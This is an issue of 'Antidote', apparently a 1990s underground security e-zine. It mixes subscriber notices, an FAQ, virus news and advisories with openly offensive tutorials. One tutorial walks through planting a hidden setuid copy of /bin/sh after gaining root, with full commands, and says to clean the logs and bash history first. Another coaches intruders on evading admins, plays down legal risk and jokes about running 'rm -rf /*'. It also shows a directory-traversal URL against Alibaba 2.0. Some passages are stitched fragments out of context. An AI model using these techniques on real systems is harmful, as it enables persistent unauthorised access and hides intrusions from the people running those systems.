   ------------------------------

    Here is another issue of Antidote that has been released. Right now we have over 415
    subscribers and getting more and more subscribers everyday. We are very sorry to say
    that we are not going to be sending Antidote as a attchment anymore because we have
    gotton so many subscribers that our mail server is going ape shit when we send them (we
    don't have a mail server just for Antidote). What we are going to start to do is just
    e-mail everyone the URL as to where they can download the new issue of Antidote. So you
    will start recieving e-mails about ever week telling you that a new issue of Antidote
    has been released and where you can get it. Sorry if this is an inconvience to anyone,
    but it is such a hassle to send this as an attachment cause of the mail server. The last
    issue that we sent as an attchment took us over 2 and a half hours to send to all of the
    users because of problems and the mail server kept crashing because of it.
	
    At Antidote, we never ask anything from anyone except articles in wich is optional, but
    now, if you could please visit our sponsor because we have to pay for the domain
    (www.thepoison.org) and it is getting to be to expensive to keep it up, though we don't
    want to take it down. So please take 2 seconds out of your time and please go to the
    fallowing URL and click on our sponsor:

	http://www.thepoison.org/popup.html

    The reason why we don't link the sponsor directly from here is
    because they have a refferal page where you type in the URL of the page that will have
    the link on it and if the refferal does not come from that page, then the 'hit' does not
    count. So please go to that URL and click on our sponsor!

0.01 --=\\What?\\=--

    What is 'Antidote'? Well, we wouldn't say that Antidote is a hacking magazine, cause
    that would be wrong. We don't claim to be a hacking magazine. All Antidote is, is
    basically current news and happenings in the underground world. We aren't going to teach
    you how to hack or anything, but we will supply you with the current information and
    exploits. Mainly Antidote is just a magazine for people to read if they have some extra
    time on there hands and are bored with nothing to do. If you want to read a magazine
    that teaches you how to hack etc, then you might want to go to your local bookstore and
    see if they carry '2600'.

   ------------------------------


0.02 --=\\FAQ\\=--

    Here are a lot of questions that we seem to recieve a lot, or our "Frequently Asked
    Questions". Please read this before e-mailing us with questions and if the question
    isn't on here or doesn't make sense, then you can e-mail us with your question.

    > What exactly is "Antidote"?
      See section 0.01 for a complete description.	
	
    > I find Antidote to not be shot for the beginner or does not teach you the basics,
    why is that?
      Antidote is for everyone, all we are basically is a news ezine that comes out once
      a week with the current news, exploits, flaws and even programming. All of the
      articles that are in here are recieved second hand (sent to us) and we very rarely
      edit anyone's articles.

    > I just found Antidote issues on your webpage, is there anyway I can get them sent
    to me through e-mail?
      Yes, if you go to www.thepoison.org/antidote there should be a text box where you can
      input your e-mail address. You will recieve Antidote the second we release it and the
      e-mail will contain a hyperlink to the URL in wich you can download the current issue.

    > If I want to submit something, are there any 'rules'?
      Please see section 0.03 for a complete description.
	
    > If I submitted something, can I remain anonymous?
      Yes. Just make sure that you specify what information about yourself you would like to
      be published above your article (when sending it to us) and we will do what you say.

    > I submitted something and I didn't see it in the current/last issue, why is that?
      It could be that someone else wrote something similar to what you wrote and they sent
      it to us first. If you sent us something and we didn't e-mail you back, then you might
      want to send it again because we probably didn't get it (we respond to all e-mails no
      matter what). We might use your article in future issues off Antidote.

    > Can I submit something that I didn't "discover" or "write"?
      Yes you can, we take information that is written by anyone regardless if you wrote it
      or not.

    Well thats it for our FAQ. If you have a question that is not on here or the question is
    on here and you had trouble understanding it, then please feel free to e-mail
    lordoak@thepoison.org and he will answer your question. This FAQ will probably be
    updated every month.

    reason you should be, then please contact Lord Oak and he will post you on here and we
    are sorry for the Misunderstanding. Well, here are the shout outs:

   ------------------------------


0.04 --=\\Writing\\=--

    As many of you know, we are always open to articles/submittings. We will take almost
    anything that has to do with computer security. This leaves you open for:

	-Protecting the system (security/securing)
	-Attacking the system (hacking, exploits, flaws, etc....)
	-UNIX (really anything to do with it...)
	-News that has to do with any of the above....

    The only thing that we really don't take is webpage hacks, like e-mailing us and saying
    "www.xxx.com" was hacked... But if you have an opinion about the hacks that is fine. If
    you have any questions about what is "acceptable" and not, please feel free to e-mail
    Lord Oak [lordoak@thepoison.org] with your question and he will answer it. Also, please
    note that if we recieve two e-mails with the same topic/idea then we will use the one
    that we recieved first. So it might be a good idea to e-mail one of us and ask us if
    someone has written about/on this topic so that way you don't waste your time on writing
    something that won't be published. An example of this would be:

	If Joe sends me an e-mail with the topic being on hacking hotmail accounts on
	thursday.
	And then Bill sends us an e-mail on hacking hotmail accounts on sunday, we will
	take Joe's article because he sent it in first.

    But keep in mind, we might use your article for the next issue! If you have something
    that you would like to submit to Antidote, please e-mail lordoak@thepoison.org or
    duece@thepoison.org  and one of us will review the article and put it in Antidote (if we
    like it).

1.01 --=\\Alibaba 2.0\\=--

    I've found a security hole in the web server Alibaba 2.0 (the latest version). I haven't
    tried it on any other version. Here's an example: If you install it so the web root is
    located in c:\alibaba\HtmlDocs\ you can send an URL:

	http://www.server.se/../../winnt/file.txt

    and get the "file.txt" file. This works all over the disk Alibaba is installed on. If
    directory browsing isn't allowed you have to know the pathname of the file you want. If
    directory browsing is allowed you can start at the disk root directory, but you have to
    enter the directories by hand when browsing, because the server will assume they are
    located in the web root, so if you just click around all you'll get is lots of 404's.
    /Arne Vidstrom- comment for Russ to be removed when posting out on the list - I haven't
    contacted the vendor at all.

1.02 --=\\CIH has gone 'phoney'\\=--

    [www.cnn.com]

    A fast-traveling rumor that the Chernobyl virus that melted down at least 600,000
    computers worldwide last month would wreak havoc on cellular phones in Lebanon on
    Saturday tangled telephone lines and briefly shut down Lebanon's telephone network. 

    Lebanese flipped off their mobiles and picked up traditional telephones to warn friends
    and family to do the same. The panic in this cellular-loving country overloaded the
    network, disrupting service for a few minutes, Ad-Diyar daily newspaper reported Sunday. 

    Losses from the drop in cellular calls amounted to dlrs 30,000, the newspaper reported. 

    The Chernobyl virus, timed to strike computers on the April 26 anniversary of the
    Chernobyl nuclear disaster, tries to erase a computer's hard drive and write gibberish
    into system settings. 

    Parliament was considering an investigation into the source of the rumor, which
    Lebanon's two cellular companies scrambled in vain to debunk as technically implausible. 

    Reporters tried Saturday to reach the Lebanese communications minister about the scare,
    according to the London-based Al-Hayat newspaper. His two cellular phones, however, were
    shut off.

1.04 --=\\Corel Virus\\=--

    [www.pcworld.com]

    A new wrinkle in computer viruses appeared this week with the discovery of a virus that
    infects the script language used by Corel products. But experts say the GaLaDRiel (or
    C.S.Gala) virus will affect few users, and is not destructive.

    The virus is not contained in the company's applications, according to a Corel
    representative. You can get it only by receiving an infected script file from another
    user via disk or download. When it triggers, all the virus does is display text.

    GaLaDRiel is "in the low-risk category," according to Sal Viveros, a spokesperson for
    Network Associates, maker of McAfee Antivirus. The virus is rare, doesn't spread easily,
    and causes minimal damage, Viveros says. 

    Although GaLaDRiel has the potential to infect other Corel Script files, it doesn't
    launch automatically. You have to run the infected script for it to spread. And the
    virus doesn't infect program files.

    After GaLaDRiel infects a Corel Script file, it will run its payload on June 6 only,
    displaying seven lines from J.R.R. Tolkien's The Lord of the Rings. As far as virus
    researchers have been able to ascertain, GaLaDRiel does nothing else.

    All major developers of antivirus software plan to add detection and removal of
    GaLaDRiel to their latest virus updates within the next two weeks.

    How to Check for the Virus


    Corel recommends taking the following steps to see if your scripts have been infected
    and to remove the virus if they have been:

      1. Using Windows Explorer, browse the directory that contains the potentially infected
         scripts.

      2. Right-click on a Corel script.csc file and select Open.

      3. When the Corel Script Editor opens, examine the first line of the script. If the
         text begins with REM ViRUS GaLaDRiel, then your script is infected.

      4. To cure the infection, delete all the script lines from REM ViRUS GaLaDRiel to REM
         END OF ViRUS.

      5. Resave your Corel Script file with the same name, overwriting the infected version.

      6. Repeat the above steps for all .csc files in the same directory. (This final step
         is important, because running any infected Corel Script file will infect all other
         .csc files in the same directory.)

1.06 --=\\SSHD Root\\=--

    When was the last time you rebuilt all privileged (`suid root') applications when
    upgrading a unix system, just in case?

    I'm pretty sure one can find `small print' that demands this, however I'm equally sure
    that hardly any system manager does so, since problems seem to occur _very_ rarely.
    Here's a neat one:

    Some time prior to the upgrade, system manager (S.M.) was asked to install `sshd' on a
    not-so-common platform (nothing really security-relevant, machine used for raw speed
    only, users just being accustomed to that sort of login). Said platform (featuring a
    particularly elaborate user data base) requires some special calls (simple calling
    sequences) to be done during `login' - no problem, `sshd' knows about them, although not
    explicitly aware of the particular hardware. Cautiously, S.M. configures `sshd' to not
    allow `root' logins from the outside.  What other harm could it possibly do?

    Upgrade has to occur somewhat in a hurry, release documentation isn't on-site, but
    procedures are known well enough. S.M. asks the manufacturer's support representative if
    special precautions have to be taken, "errr, not that I'd think so". S.M. installs new
    version, all fine & dandy, even remembers to check out `sshd' afterwards and finds it to
    work the same as before.

    A couple of days later, S.M. logs in via `sshd' himself, and for the first time enters
    `su'. Gets very amazed at the new system's intelligence, as it knows to not ask him for
    a password. Minutes later, S.M. recognizes that `su' would never ask for a password,
    when the parent process had been created via `sshd' ... in spite of no other visible
    peculiarities with that process.

    A re-build (pretty likely boiling down to nothing but a re-link) of `sshd' fixed the
    problem.

    Quite a few years ago, when I saw the first mention of `ssh', I commented  "If you're a
    bank, you don't buy your safe at a flea market;  if you're not, you might be better off
    without a safe".  Maybe there's _some_ truth in it, after all.

    Imagine uSoft going open source, and no-one going to have a look at it...

2.01 --=\\Root : Anytime\\=--

    After gaining root access to a server you always risk the chance of losing access.  The
    admin may change the password or fix the hole allowing a root shell.  Well now you have
    a way to keep that root shell.  The admin can change the password or fix the security
    hole.  As long as you have local access, you have root access. Down to the nitty gritty.
    In the /bin dir there is file named sh.  This is the actual shell.  By running this the
    user will have shell access to the user that owns it.  

      Once you have root on the computer, after you fix the logs and the .bash_history, go
    to the /bin dir and copy sh to a dir with permissions of 777 (or that you have access
    to.). After you have finished go back and change permissions on the dir to 700 so no one
    else can access this without knowing the file name and where it is. If you have an
    account the box simply create a dir inside your home dir where you can hide it.  If you
    don't have access then you can copy it to the /tmp dir or even make a different and hide
    it. To hide the dir instead of a name such as HERE, use .HERE. The period in front will
    hide it from ls(using ls -a will show it).  Now once you have sh in that dir chmod it to
    4777 this will modify the setuid bit, allowing it to set the userid of the person who
    ran the file, to userid of the owner of the file, in this case root.  Now time to hide
    this file. In case you dir is found or viewed hide the file.  Again instead of leaving
    the name sh name it .sh, or even go father and name it something other than sh so its
    not as noticalbe. Now you have a ROOT SHELL any time.  This also works with users other
    than root.

    Heres a lil example:
    [root@hacked box]$ mkdir /home/forlorn/.here
    [root@hacked box]$ chmod 777 /home/forlorn/.here
    [root@hacked box]$ copy /bin/sh /home/forlorn/.here
    [root@hacked box]$ cd /home/forlorn/.here
    [root@hacked box]$ chmod 4777 sh
    [root@hacked box]$ mv sh .jk
    [root@hacked box]$ su forlorn
    password:
    [forlorn@hacked box]$ cd .here
    ./.jk
    bash# whoami
    root

    heh :)
    rootshell anytime

2.02 --=\\How Not to Get Caught\\=--

    Lots have said it. "I am scared to hack because I might get cought and go to jail!!!",
    etc, etc, etc.  You've all seen it before. There are plenty of ways to be catious. And
    not to get cought(or get on the publics and medias good side if you do).  When hacking
    any type of *nix system, always check /etc/syslog.conf and check to make sure all the
    logs were takin care off. A good Sys Admin will log in more places then in /var/log/.
    Ya know?  Among other things, DONT EVER DELETE OR MODIFY UNNESSISARY FILES. EVER. of
    course, unless the admin has completly made of fool of you, then feel free to do a
    rm -rf /* if you like. =P  If you are patient, you could always commence your hack of a
    machine/network over a period of time to lower suspision.  Lots of logs in 1 night of
    you attacking would be noticed easier by a  admin/log-checker then one over a period of
    2 weeks or soo. Attacking patiently will reduce the chances of you being noticed while
    tryin to gain access. This is a mistake many new skool hackers have made. Braggin bout
    your hacks. Posting on 500 usenets and bbs's saying "Y0 F00LZ I H4K0R3D FBI.GOV" will
    get you busted real fast, if you catch my drift. Keep your major hacks to yourself
    and/or you group. You should have pride in your hacks, and knowing that no one else
    knows you are there is a great feeling that you know you have truely gained access to a
    computer as a ghost.
    Of course, you could just be having a bad day, and you just forget to clean one little
    thing out and the admin notices. First off, the action takin to a hacker is greatly
    exhagereated. A admin of a machine in the middle of bumfuck ohio mailin your ISP about a
    hack wont do much to ya. Most ISPs, when told about criminal activity just cancel your
    account, and thats it. Unless it is federal, international, or had something to do with
    banks or large corps. Lets just say, you wont go to jail for hacking anything worth
    under $50k. =) heh. Now, if it is big, and you get cought hacking, say, looking at
    planes for the new F-22 stealth fighter curcitry plans, you will go to court swiftly.
    This is when your not deleting or modifying comes in handy. The media will glorify you
    as a victim if you just simply say, "I was reading some very interesting information
    about the unclassified planes". They will give you the publics love, and that is good!
    heh. out of all my experience, the above are the most importent things I have learned to
    do and abide by. Remmember, more then 100X's the new skool(malicious) hackers are caught
    then us oldskool hackers!

    To help anyone to detect trojan attacks, I´m planning to add information about the
    original names of the executables, their size, where they usually are hiding, and the
    names of any helpfiles they may use. I will also add tools or links to tools that may be
    of your assistance.

    Feel free to get back to me with any comments or suggestions. If you find new trojans
    I´ll love to get my hands on them, but please mail me first, as I don´t need more than
    one copy. If you have live experiance of trojan attacks I´m interested to read about
    your findings.
